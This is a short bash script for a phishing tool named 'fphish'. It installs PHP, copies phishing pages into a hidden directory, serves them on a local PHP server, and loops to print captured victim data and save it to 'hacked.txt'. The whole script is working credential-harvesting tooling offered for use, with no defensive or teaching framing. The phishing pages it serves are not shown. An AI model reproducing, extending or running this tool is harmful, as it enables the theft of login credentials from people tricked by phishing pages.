#!/usr/bin/bash 
# made by prince kumar 
# date 28 jan 2022
# check for requirements 
trap user_intrupt SIGINT
trap user_intrupt SIGTSTP
user_intrupt(){
	printf " \n ${w}\n"
	printf " ${r}[${w}!${r}]---->>${p} Exiting fphish"
	printf " \n"
	sleep 1
	exit 1
}
# make a banner function 
banner(){
    clear
    echo -ne "≋f≋p≋h≋i≋s≋h≋ "
    echo -ne "\033[0;1m MADE BY PRINCE"
}
req(){
    command -v php 2>&1 > /dev/null || { echo -e "\033[31;1m Installing php" ;apt-get install php; } 
}
req
banner
#Get the pid and kill the php process...
pidkill(){
	id=$(pidof php)
	kill $id > /dev/null 2>&1
}
#make function to check the files make a hiden function 
hidden(){
	if [ -d .pweb ];then
		rm -rf .pweb
		mkdir .pweb
		echo " "
	else
		mkdir .pweb
	fi
}
hidden 
# now move the all content to this folder 
mov(){
    cp -R server/* .pweb > /dev/null 
}
mov
# now make a function to start the localhost server
l_server(){
    echo -en "\033[36;1m Enter a port number: "
    read port 
    # now start the server 
    php -S 127.0.0.1:$port -t .pweb > /dev/null 2>&1 & sleep 4
    echo -e "\033[35;1m server started on http://127.0.0.1:$port"
}
l_server
# make a function to check the data 
user_data(){
   while true;do
		if [[ -f .pweb/userd.txt ]];then
			echo -e "${g}[${w}+${g}] ${y} User data found ${w}"
			echo " "
			cat .pweb/userd.txt
			echo -e "\n"
			cat .pweb/userd.txt >> hacked.txt
			rm -rf .pweb/userd.txt
			echo -e "${w}[${r}+${w}] ${y} Saving data into hacked.txt"
			echo " "
		fi
    done
}
user_data
